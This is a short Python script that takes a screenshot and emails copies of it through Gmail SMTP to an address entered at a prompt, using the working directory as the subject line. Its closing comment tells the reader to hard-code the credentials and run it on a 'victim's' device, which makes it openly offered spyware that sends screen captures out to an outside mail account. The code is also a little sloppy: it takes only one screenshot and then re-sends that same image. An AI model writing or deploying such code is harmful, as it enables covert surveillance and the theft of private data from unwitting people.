import yagmail
import cv2
import numpy as np
import os
import pyautogui
user1 = input("[*] Enter Your Email :: ")
app_password1 = input("[*] Enter Your App-Password {Not Your Email-Password }:: ")#Enter your Email APP-PASSWORD Hear
to=[user1]
subject1 = os.getcwd()
content1 = [' ']
n=int(input("[*] How Many Times To Recive Email :: "))
src=pyautogui.screenshot()
print("[*] Starting Process { Check Your Email-Box }")
for i in range(0,n,1):
    x=str(i+1)
    src=cv2.cvtColor(np.array(src),cv2.COLOR_RGB2BGR)
    g=str(i)
    name="src"+g+".png"
    cv2.imwrite(name,src)
    with yagmail.SMTP(user1, app_password1) as yag:
        yag.send(to, content1, subject1,attachments=[name])
        print("["+x+"]"+"Process Completed")
 """
 you'll may hard code this Program and run it in Victims's Device  
 make sure you'll encrypt the password while you hard code the program"""
